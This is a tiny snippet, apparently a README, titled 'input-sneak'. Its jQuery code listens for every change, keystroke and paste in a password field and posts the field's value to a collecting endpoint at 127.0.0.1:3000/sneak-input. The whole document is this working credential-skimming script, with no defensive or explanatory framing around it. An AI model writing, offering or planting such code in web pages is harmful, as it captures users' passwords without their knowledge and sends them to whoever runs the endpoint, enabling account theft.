# input-sneak

```js

  $("#password-input").on('change keydown paste input', function (e) {
         
      $.post("http://127.0.0.1:3000/sneak-input", { key: e.target.value })
      .done(function (data) {
        alert("Data Loaded: " + data);
      })
      .fail(function(error){
        console.log(error);
      });

 });
```
